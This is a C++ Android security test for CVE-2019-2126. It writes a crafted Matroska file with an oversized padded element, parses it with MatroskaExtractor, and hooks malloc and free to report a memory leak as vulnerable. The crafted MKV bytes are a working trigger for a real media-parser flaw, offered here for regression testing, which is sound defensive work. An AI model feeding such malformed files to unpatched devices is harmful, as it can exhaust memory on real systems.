/**
 * Copyright (C) 2020 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include <dlfcn.h>
#include <sys/mman.h>
#include <media/IMediaHTTPService.h>
#include <media/stagefright/DataSource.h>
#include "matroska/MatroskaExtractor.h"
#include "../includes/common.h"

using namespace android;
#define LEAK_SIZE          16000000
#define LEAK_DATA          0x61
#define TMP_FILE           "/data/local/tmp/temp_cve_2019_2126"
#define MAX_ENTRIES        1024
void check_memleak(void);

#define ALLOCATED_STATE      1
#define FREED_STATE          2

unsigned char mkvDataStart[] = { 0x1A, 0x45, 0xDF, 0xA3, 0x10, 0x00, 0x00, 0x0A,
        0x42, 0x82, 0x10, 0x00, 0x00, 0x04, 0x77, 0x65, 0x62, 0x6D, 0x18, 0x53,
        0x80, 0x67, 0x10, 0xF4, 0x24, 0x49, 0x16, 0x54, 0xAE, 0x6B, 0x10, 0xF4,
        0x24, 0x41, 0xAE, 0x10, 0xF4, 0x24, 0x3C, 0xD7, 0x81, 0x01, 0x83, 0x81,
        0x01, 0xE0, 0x10, 0x00, 0x00, 0x03, 0xB0, 0x81, 0x01, 0x6D, 0x80, 0x10,
        0xF4, 0x24, 0x28, 0x62, 0x40, 0x10, 0xF4, 0x24, 0x22, 0x50, 0x34, 0x10,
        0xF4, 0x24, 0x19, 0x42, 0x54, 0x81, 0x01, 0x42, 0x55, 0x10, 0xF4, 0x24,
        0x00 };

unsigned char mkvDataEnd[] = { 0x42, 0x55, 0x81, 0x61, 0x42, 0x54, 0x88, 0xFF,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x50, 0x35, 0x80 };

typedef struct {
    void* ptr;
    size_t size;
    int status;
    int index;
} allocated_mem_ptr;

static void* (*real_malloc)(unsigned long) = NULL;
static void (*real_free)(void *) = NULL;
static int s_memutils_initialized = 0;
static int index = 0;
static allocated_mem_ptr mem_ptrs[MAX_ENTRIES] = { { 0, 0, 0, 0 } };

void exit_handler(void) {
    remove(TMP_FILE);
    check_memleak();
}

void memutils_init(void) {
    real_malloc = (void *(*)(unsigned long))dlsym(RTLD_NEXT, "malloc");
    if (real_malloc == NULL) {
        return;
    }
    real_free = (void (*)(void *))dlsym(RTLD_NEXT, "free");
    if (real_free == NULL) {
        return;
    }
    atexit(exit_handler);
    s_memutils_initialized = 1;
}

void *malloc(size_t size) {
    void* mem_ptr = NULL;
    if (s_memutils_initialized == 0) {
        memutils_init();
    }
    if (size != LEAK_SIZE) {
        return real_malloc(size);
    }
    if (index >= MAX_ENTRIES) {
        return real_malloc(size);
    }
    mem_ptr = real_malloc(size);
    mem_ptrs[index].ptr = mem_ptr;
    mem_ptrs[index].status = ALLOCATED_STATE;
    mem_ptrs[index].size = size;
    mem_ptrs[index].index = index;
    index++;
    return mem_ptr;
}

void free(void *ptr) {
    if (s_memutils_initialized == 0) {
        memutils_init();
    }
    if (ptr) {
        for (int i = 0; i < MAX_ENTRIES; i++) {
            if (ptr == mem_ptrs[i].ptr) {
                if ((i == mem_ptrs[i].index)
                        && (mem_ptrs[i].status != FREED_STATE)) {
                    real_free(ptr);
                    mem_ptrs[i].status = FREED_STATE;
                    return;
                }
            }
        }
    }
    real_free(ptr);
    return;
}

void check_memleak(void) {
    for (int i = 0; i < MAX_ENTRIES; i++) {
        if (mem_ptrs[i].status == ALLOCATED_STATE) {
            exit (EXIT_VULNERABLE);
        }
    }
    return;
}
int main() {
    FILE* fp = fopen(TMP_FILE, "wb");
    if (!fp) {
        return EXIT_SUCCESS;
    }

    char *appendArray = (char *) malloc(LEAK_SIZE);
    memset(appendArray, LEAK_DATA, LEAK_SIZE * sizeof(char));

    /* Read mkv stream */
    fwrite(mkvDataStart, 1, sizeof(mkvDataStart), fp);

    /* Append a bitstream which causes memory leak */
    fwrite(appendArray, 1, LEAK_SIZE, fp);
    fwrite(mkvDataEnd, 1, sizeof(mkvDataEnd), fp);
    free((void *) appendArray);
    fclose(fp);

    sp < DataSource > dataSource = DataSource::CreateFromURI(NULL, TMP_FILE);
    if (dataSource != nullptr) {
        new MatroskaExtractor(dataSource);
    }

    return EXIT_SUCCESS;
}
